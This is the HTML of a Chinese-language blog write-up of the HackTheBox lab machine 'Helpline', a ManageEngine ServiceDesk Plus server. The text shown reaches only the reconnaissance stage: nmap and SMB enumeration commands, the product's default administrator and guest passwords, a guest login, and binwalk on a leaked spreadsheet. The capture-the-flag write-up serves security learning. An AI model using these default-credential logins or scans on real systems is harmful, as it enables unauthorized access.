@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Helpline - T0x1c</title>
+
+  
+    <meta name="description" content="Helpline是一个非常难的靶机，其中涉及了EFS解密和ME SDP的多个漏洞，包括XXE漏洞、LFI\任意文件下载漏洞、身份认证绕过漏洞以及远程代码执行漏洞。在上线shell方面ME SDP帮助了我们很多。尽管上线的是系统最高权限，但是需要解密EFS才能读取关键flag，这里面涉及很多加密、解密以及证书的知识，同时该靶机还存在多种方式来获取flag，感兴趣的同学可以在HackTheBox中进行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Helpline">
+<meta property="og:url" content="https://toxic80l.github.io/post/f1c1ab55/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Helpline是一个非常难的靶机，其中涉及了EFS解密和ME SDP的多个漏洞，包括XXE漏洞、LFI\任意文件下载漏洞、身份认证绕过漏洞以及远程代码执行漏洞。在上线shell方面ME SDP帮助了我们很多。尽管上线的是系统最高权限，但是需要解密EFS才能读取关键flag，这里面涉及很多加密、解密以及证书的知识，同时该靶机还存在多种方式来获取flag，感兴趣的同学可以在HackTheBox中进行">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0050.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-20%20%E4%B8%8B%E5%8D%884.20.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%882.20.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%882.21.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%884.55.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%884.58.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.26.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.31.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.33.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.35.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.12.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.28.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.28.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%889.29.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8B%E5%8D%884.33.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-22%20%E4%B8%8B%E5%8D%885.03.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%885.53.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.18.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.27.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%886.30.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.19.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.44.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.44.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-25%20%E4%B8%8B%E5%8D%887.46.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%882.36.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%882.37.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.14.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.37.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%883.41.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.02.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.15.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.18.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%884.20.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.37.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.41.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.43.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8A%E5%8D%885.43.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%884.53.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%884.52.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.04.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.06.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.13.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.16.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.19.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.27.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.31.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.51.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.56.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%885.59.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.04.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.05.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.09.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.12.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.16.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.24.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.30.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.33.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.46.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.47.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.50.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.54.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%886.56.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.00.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.01.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.07.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.10.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.16.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.22.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.24.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-26%20%E4%B8%8B%E5%8D%887.28.08.png">
+<meta property="article:published_time" content="2021-12-26T11:32:22.000Z">
+<meta property="article:modified_time" content="2021-12-26T13:29:39.752Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0050.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3"><span class="toc-text">445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8080%E7%AB%AF%E5%8F%A3"><span class="toc-text">8080端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4guest%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-text">默认guest账户登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ME-SDP-%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x02 ME SDP 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-9362%EF%BC%89"><span class="toc-text">XXE漏洞（CVE-2017-9362）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%88CVE-2017-11511%EF%BC%89"><span class="toc-text">LFI&#x2F;任意文件下载（CVE-2017-11511）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-text">身份验证绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%8A%E7%BA%BF-system"><span class="toc-text">0x03 上线[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rce%E5%AE%8C%E6%88%90%E4%B8%8A%E7%BA%BF"><span class="toc-text">rce完成上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96flag"><span class="toc-text">msf进程注入读取flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E8%A7%A3%E5%AF%86EFS"><span class="toc-text">0x04 解密EFS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96root-txt"><span class="toc-text">读取root.txt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%AF%81%E4%B9%A6"><span class="toc-text">获取证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-text">获取私钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-text">解密万能钥匙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E7%A7%81%E9%92%A5"><span class="toc-text">解密私钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E5%B9%B6%E5%AE%89%E8%A3%85PFX"><span class="toc-text">构建并安装PFX</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96user-txt"><span class="toc-text">读取user.txt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%AF%81%E4%B9%A6-1"><span class="toc-text">获取证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A7%81%E9%92%A5-1"><span class="toc-text">获取私钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99-1"><span class="toc-text">解密万能钥匙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E7%A7%81%E9%92%A5-1"><span class="toc-text">解密私钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E5%B9%B6%E5%AE%89%E8%A3%85pfx"><span class="toc-text">构建并安装pfx</span></a></li></ol></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2021-12-26T11:32:22.000Z">2021-12-26</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Helpline</span></h1>
+<p>Helpline是一个非常难的靶机，其中涉及了EFS解密和ME SDP的多个漏洞，包括XXE漏洞、LFI\任意文件下载漏洞、身份认证绕过漏洞以及远程代码执行漏洞。在上线shell方面ME SDP帮助了我们很多。尽管上线的是系统最高权限，但是需要解密EFS才能读取关键flag，这里面涉及很多加密、解密以及证书的知识，同时该靶机还存在多种方式来获取flag，感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0050.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-20%20%E4%B8%8B%E5%8D%884.20.17.png" alt="截屏2021-12-20 下午4.20.17"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.132 -oA nmap_Helpline</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%882.20.22.png" alt="截屏2021-12-21 下午2.20.22"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%882.21.05.png" alt="截屏2021-12-21 下午2.21.05"><br>通过 nmap 的扫描结果可以发现目前靶机开放了135、445、5985、8080以及49667端口</p>
+<h4 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h4><p>使用 smbclient 和 smbmap 查看默认共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.10.10.132</span><br><span class="line">smbmap -H 10.10.10.132 -v</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%884.55.26.png" alt="截屏2021-12-21 下午4.55.26"><br>访问被拒绝，除非找到一些凭据否则将无法利用 smb 服务</p>
+<h4 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%884.58.00.png" alt="截屏2021-12-21 下午4.58.00"><br>是一个 ManageEngine ServiceDesk Plus 站点，版本为 9.3</p>
+<h3 id="默认guest账户登录"><a href="#默认guest账户登录" class="headerlink" title="默认guest账户登录"></a>默认guest账户登录</h3><p>在 ManageEngine ServiceDesk Plus 存在两个默认账户</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">administrator/administrator</span></span><br><span class="line"><span class="string">guest/guest</span></span><br></pre></td></tr></table></figure>
+<p>在登录 administrator 无果后使用 guest 账户成功到登录应用中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.26.34.png" alt="截屏2021-12-21 下午5.26.34"><br>在 Solution 选项卡中可以看到 Password Audit<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.31.39.png" alt="截屏2021-12-21 下午5.31.39"><br>点进去查看，发现存在一个 excel 表格<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.33.00.png" alt="截屏2021-12-21 下午5.33.00"><br>下载打开后如图所示，只有三个表<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f1c1ab55/%E6%88%AA%E5%B1%8F2021-12-21%20%E4%B8%8B%E5%8D%885.35.00.png" alt="截屏2021-12-21 下午5.35.00"><br>通过 binwalk 分解该 excel 表格，从中可以发现存在四张表，这表明原来有一张表隐藏了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e Password+Audit.xlsx</span><br></pre></td></tr></table></figure>
